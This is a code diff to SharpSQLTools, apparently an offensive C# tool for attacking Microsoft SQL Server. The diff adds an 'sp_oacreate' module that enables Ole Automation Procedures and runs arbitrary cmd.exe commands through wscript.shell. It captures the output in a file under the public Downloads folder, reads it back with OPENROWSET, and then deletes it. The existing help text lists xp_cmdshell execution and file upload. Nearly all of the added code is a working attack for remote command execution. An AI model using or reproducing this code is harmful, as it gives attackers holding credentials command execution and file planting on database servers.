@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Data;
@@ -21,6 +21,7 @@ namespace SharpSQLTools
 enable_xp_cmdshell         - you know what it means
 disable_xp_cmdshell        - you know what it means
 xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+sp_oacreate {cmd}          - executes cmd using sp_oacreate
 enable_ole                 - you know what it means
 disable_ole                - you know what it means
 upload {local} {remote}    - upload a local file to a remote path (OLE required)
@@ -58,6 +59,51 @@ exit                       - terminates the server process (and this session)"
         {
             sqlstr = String.Format("exec master..xp_cmdshell '{0}'", Command);
             Console.WriteLine(Batch.RemoteExec(Conn, sqlstr, true));
+        }
+
+
+        /// <summary>
+        /// sp_oacreate 执行命令
+        /// </summary>
+        /// <param name="Command">命令</param>
+        static void sp_shell(String Command)
+        {
+            if (setting.Check_configuration("Ole Automation Procedures", 0))
+            {
+                if (setting.Enable_ola()) return;
+            }
+            string shell = String.Format(@"
+                    DECLARE @SHELL INT 
+                    EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
+                    EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c ");
+            string outfile = @"C:\Users\Public\Downloads\result.txt";
+            string sqlstr = shell + Command + @" > " + outfile + "'";
+            Console.WriteLine(@"[+] c:\windows\system32\cmd.exe /c {0} > {1}", Command, outfile);
+            Batch.RemoteExec(Conn, sqlstr, false);
+            if (!setting.File_Exists(outfile, 1))
+            {
+                Console.WriteLine("[!] {0} file does not exist....", outfile);
+                return;
+            }
+            Console.WriteLine("[+] Reading " + outfile);
+            string readstr = String.Format(@"SELECT * FROM OPENROWSET(BULK N'{0}', SINGLE_CLOB) rs", outfile);
+            SqlCommand sqlComm = new SqlCommand(readstr, Conn);
+            //string outreadstr;
+            //接收查询到的sql数据
+            using (SqlDataReader reader = sqlComm.ExecuteReader())
+            {
+                //读取数据 
+                while (reader.Read())
+                {
+                    if (false == reader.IsDBNull(0))
+                    {
+                        Console.WriteLine(String.Format("\n\r{0}", reader[0]));
+                    }
+                }
+            }
+            string delstr = String.Format(@"del {0}'", outfile);
+            Batch.RemoteExec(Conn, shell + delstr, false);
+
         }
 
         /// <summary>
@@ -130,18 +176,17 @@ exit                       - terminates the server process (and this session)"
                         EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'{1}', 2
                         EXEC sp_OAMethod @ObjectToken, 'Close'
                         EXEC sp_OADestroy @ObjectToken", hex150000, filePath);
-
-                    Batch.RemoteExec(Conn, sqlstr, false);
-                    if (setting.File_Exists(filePath, 1))
-                    {
-                        Console.WriteLine("[+] {0}-{1} Upload completed", arrlist.Count, count);
-                    }
-                    else
-                    {
-                        Console.WriteLine("[!] {0}-{1} Error uploading", arrlist.Count, count);
-                        Conn.Close();
-                        Environment.Exit(0);
-                    }
+                     Batch.RemoteExec(Conn, sqlstr, false);
+                     if (setting.File_Exists(filePath, 1))
+                     {
+                         Console.WriteLine("[+] {0}-{1} Upload completed", arrlist.Count, count);
+                     }
+                     else
+                     {
+                         Console.WriteLine("[!] {0}-{1} Error uploading", arrlist.Count, count);
+                         Conn.Close();
+                         Environment.Exit(0);
+                     }
 
                     Thread.Sleep(5000);
                 }
@@ -282,6 +327,13 @@ exit                       - terminates the server process (and this session)"
                                 xp_shell(s);
                                 break;
                             }
+                        case "sp_oacreate":
+                            {
+                                String s = String.Empty;
+                                for (int i = 1; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                sp_shell(s);
+                                break;
+                            }
                         case "upload":
                             UploadFiles(cmdline[1], cmdline[2]);
                             break;
@@ -353,7 +405,6 @@ exit                       - terminates the server process (and this session)"
             string username = args[1];
             string password = args[2];
             string module = args[3];
-
             try
             {
                 //sql建立连接
@@ -384,6 +435,9 @@ exit                       - terminates the server process (and this session)"
                             break;
                         case "xp_cmdshell":
                                 xp_shell(args[4]);
+                                break;
+                        case "sp_oacreate":
+                                sp_shell(args[4]);
                                 break;
                         case "upload":
                             UploadFiles(args[4], args[5]);
